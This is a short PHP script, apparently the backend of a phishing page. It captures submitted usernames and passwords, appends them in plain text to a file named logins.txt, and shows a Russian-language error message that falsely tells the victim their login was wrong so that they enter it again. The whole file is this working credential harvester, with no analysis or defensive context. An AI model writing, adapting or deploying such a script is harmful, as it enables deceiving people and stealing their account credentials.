<?php
header('Content-Type: text/html; charset=utf-8');
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $file = 'logins.txt';
    $data = "Логин: $username | Пароль: $password\n";
    file_put_contents($file, $data, FILE_APPEND);

    echo "<h2>Введите правильно логин и пароль!.</h2>";
} else {
    echo "Неверный метод запроса.";
}
?>